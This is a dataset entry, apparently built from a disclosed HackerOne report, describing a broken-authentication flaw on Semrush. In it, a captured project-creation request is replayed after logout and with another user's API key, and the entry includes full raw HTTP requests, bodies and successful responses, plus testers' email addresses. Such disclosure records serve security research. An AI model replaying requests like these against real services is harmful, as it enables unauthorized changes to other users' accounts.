@@ -1,0 +1,38 @@
+{
+    "reported_to": "Semrush",
+    "reported_by": "walterhwhite ",
+    "title": "Broken Authentication: A project addition request can be used multiple time for different users",
+    "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\nSummary:\n[Broken Authentication. A project addition request can be used multiple time for different users]\nDescription:\n[Reusable requests. Once a project addition request is captured it can be used any number of times even after logout not only for the corresponding user but for any user with API key.\nSteps To Reproduce:\nCreate two users for semrush.com\ni) cleganearya1@gmail.com\nii)saidutt.mekala@gmail.com\nNow create a project for the user saidutt.mekala@gmail.com\nFollowing will be the request along with headers for project creation:\nPOST /projects/api/projects/?key=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: application/json, text/javascript, /; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://www.semrush.com/projects/?1519503450\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nContent-Length: 86\nCookie: cfduid=d586fa9b6fb028d425a8df52599e73d021519503413; PHPSESSID=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; ref_code=default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; n_userid=LuWkzFqRyDaG+2bqBEeyAg==; semrush_counter_cookie=deleted; visit_first=1519503421910; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; wp13557=UWYYADDDDDDIKXCIMMK-JBZZ-XLLX-BYCY-ILTWWCUBMTICDMUMLJIZI-AZAL-XLML-CJHX-WTBKZBVKZXWVDlLtkNlo_Jht; uvts=7B3Au3azsgVbSB6R; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en\nDNT: 1\nConnection: keep-alive\n{\"domain\":\"BB1236.com\",\"name\":\"BB12367.com\",\"url\":\"BB123678.com\",\"acl\":{\"write\":true}}\nNow delete the added project.\nLogout of the application and close the browser.\nResend the above request with different parameters like {\"domain\":\"Walterwhite12.com\",\"name\":\"Walterwhite12.com\",\"url\":\"Walterwhite12.com\",\"acl\":{\"write\":true}}\nFollowing is the response:\nHTTP/1.1 200\nDate: Sun, 25 Feb 2018 06:50:58 GMT\nContent-Type: application/json;charset=UTF-8\nConnection: keep-alive\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 3f28bbc28bbd17aa-SIN\nContent-Length: 224\n{\"id\":1266025,\"domain\":\"walterwhite12.com\",\"name\":\"Walterwhite12.com\",\"email\":\"saidutt.mekala@gmail.com\",\"tools\":[],\"permission\":[\"OWNER\"],\"available\":true,\"favorite\":false,\"root_domain\":\"walterwhite12.com\",\"times_shared\":0}\nNow we can also add the project to any user by using his API Key in the request. In the following request I have used the API Key of the user cleganearya1@gmail.com :\nPOST /projects/api/projects/?key=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: application/json, text/javascript, /; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://www.semrush.com/projects/?1519503450\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nContent-Length: 104\nCookie: cfduid=d586fa9b6fb028d425a8df52599e73d021519503413; PHPSESSID=\u2588\u2588\u2588\u2588\u2588\u2588; ref_code=default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; n_userid=LuWkzFqRyDaG+2bqBEeyAg==; semrush_counter_cookie=deleted; visit_first=1519503421910; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; wp13557=UWYYADDDDDDIKXCIMMK-JBZZ-XLLX-BYCY-ILTWWCUBMTICDMUMLJIZI-AZAL-XLML-CJHX-WTBKZBVKZXWVDlLtkNlo_Jht; uvts=7B3Au3azsgVbSB6R; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en\nDNT: 1\nConnection: keep-alive\n{\"domain\":\"Walterwhite12.com\",\"name\":\"Walterwhite12.com\",\"url\":\"Walterwhite12.com\",\"acl\":{\"write\":true}}\nFollowing is the response for the above request:\nHTTP/1.1 200\nDate: Sun, 25 Feb 2018 06:53:17 GMT\nContent-Type: application/json;charset=UTF-8\nConnection: keep-alive\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 3f28bf1e9f8917aa-SIN\nContent-Length: 222\n{\"id\":1266027,\"domain\":\"walterwhite12.com\",\"name\":\"Walterwhite12.com\",\"email\":\"cleganearya1@gmail.com\",\"tools\":[],\"permission\":[\"OWNER\"],\"available\":true,\"favorite\":false,\"root_domain\":\"walterwhite12.com\",\"times_shared\":0}\nImpact\nOnce a project addition request is captured it can be used any number of times even after logout not only for the corresponding user but for any user with API key. Hence there is no need to login for the user to create a project because an attacker can directly add a project to victims account with his own malicious inputs/scrips and make them executable without victims awareness.\ni) Reusable cookies for same user.\nii)There is no match verification between the API Key and cookie/sessionIds. There should be a server side validation which should validate the relation between an API Key provided and the sessionIds of the current user.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Key Exchange without Entity Authentication"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1520965800,
+    "report_url": "https://hackerone.com/reports/319480",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Create two users on semrush.com (e.g., cleganearya1@gmail.com and saidutt.mekala@gmail.com)."
+        ],
+        [
+            2,
+            "Capture the project creation request for one user, then reuse it with another user's API key to create projects without authentication."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to reuse a captured project creation request to add projects to any user's account by simply changing the API key in the request. This bypasses authentication checks and does not require the attacker to be logged in.",
+    "reason": "The attack involves capturing and reusing a single HTTP request with minimal modifications (changing the API key), and does not require complex interactions or understanding of multiple system components.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
